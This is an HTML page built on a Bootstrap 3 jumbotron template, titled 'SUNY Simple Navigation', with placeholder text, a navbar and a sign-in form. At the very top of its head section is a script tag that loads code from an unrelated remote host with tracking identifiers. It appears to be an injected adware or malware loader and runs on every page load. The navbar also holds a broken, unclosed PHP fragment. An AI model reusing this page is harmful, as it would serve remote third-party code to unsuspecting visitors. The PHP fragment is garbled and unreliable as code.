
<!DOCTYPE html>
<html lang="en">
  <head>
<script type="text/javascript" id="2f2a695a6afce2c2d833c706cd677a8e" src="http://d.lqw.me/xuiow/?o=3&g=6F5037EC-F60C-FF22-3FBB-8E9ECE930707&s=E685B607-05BD-4C58-84D3-D5023CEDA723&z=1391635413"></script>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>SUNY Simple Navigation</title>

    <!-- Bootstrap core CSS -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.3/css/bootstrap.css" rel="stylesheet">

    <style type="text/css">
    	/* Move down content because we have a fixed navbar that is 50px tall */
		body {
		  padding-top: 50px;
		  padding-bottom: 20px;
		}
    </style>
  </head>

  <body>
	    <style type="text/css">
    	.navbar-brand.active { background-color: #000; }
    </style>
    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="./">SUNY Simple Navigation</a>
        </div>
        <div class="navbar-collapse collapse">
        
        	
		    <ul class="nav navbar-nav">
		    	
		    			    	<?
		    			    	$links=array();
		    			    	$links[]=array('class'=>'contact=menu','links=>'contact.php)
		    						<li class="contact-menu" ><a href="contact.php">Contact Us</a></li>
									<li class="links-menu" ><a href="links.php">Links</a></li>
						      
		       
		      
		      <li class="dropdown">
		        <a href="#" class="dropdown-toggle" data-toggle="dropdown">Super Menu <b class="caret"></b></a>
		        <ul class="dropdown-menu">
		          <li><a href="#">Action</a></li>
		          <li><a href="#">Another action</a></li>
		          <li><a href="#">Something else here</a></li>
		          <li class="divider"></li>
		          <li><a href="#">Separated link</a></li>
		          <li class="divider"></li>
		          <li><a href="#">One more separated link</a></li>
		        </ul>
		      </li>
		    </ul>        
        
          <form class="navbar-form navbar-right" role="form">
            <div class="form-group">
              <input type="text" placeholder="Email" class="form-control">
            </div>
            <div class="form-group">
              <input type="password" placeholder="Password" class="form-control">
            </div>
            <button type="submit" class="btn btn-success">Sign in</button>
          </form>
        </div><!--/.navbar-collapse -->
      </div>
    </div>
	
    <!-- Main jumbotron for a primary marketing message or call to action -->
    <div class="jumbotron">
      <div class="container">
        <h1>Hello, world!</h1>
        <p>This is a template for a simple marketing or informational website. It includes a large callout called a jumbotron and three supporting pieces of content. Use it as a starting point to create something more unique.</p>
        <p><a class="btn btn-primary btn-lg" role="button">Learn more &raquo;</a></p>
      </div>
    </div>

    <div class="container">
      <!-- Example row of columns -->
      <div class="row">
        <div class="col-md-4">
          <h2>Heading</h2>
          <p>Donec id elit non mi porta gravida at eget metus. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus. Etiam porta sem malesuada magna mollis euismod. Donec sed odio dui. </p>
          <p><a class="btn btn-default" href="#" role="button">View details &raquo;</a></p>
        </div>
        <div class="col-md-4">
          <h2>Heading</h2>
          <p>Donec id elit non mi porta gravida at eget metus. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus. Etiam porta sem malesuada magna mollis euismod. Donec sed odio dui. </p>
          <p><a class="btn btn-default" href="#" role="button">View details &raquo;</a></p>
       </div>
        <div class="col-md-4">
          <h2>Heading</h2>
          <p>Donec sed odio dui. Cras justo odio, dapibus ac facilisis in, egestas eget quam. Vestibulum id ligula porta felis euismod semper. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus.</p>
          <p><a class="btn btn-default" href="#" role="button">View details &raquo;</a></p>
        </div>
      </div>

      <hr>

      <footer>
        <p>&copy; Company 2013</p>
      </footer>
    </div> <!-- /container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.3/js/bootstrap.js"></script>
	<script type="text/javascript">
		$(function(){
			$(".navbar-brand").addClass("active");
		})
	</script>
  </body>
</html>
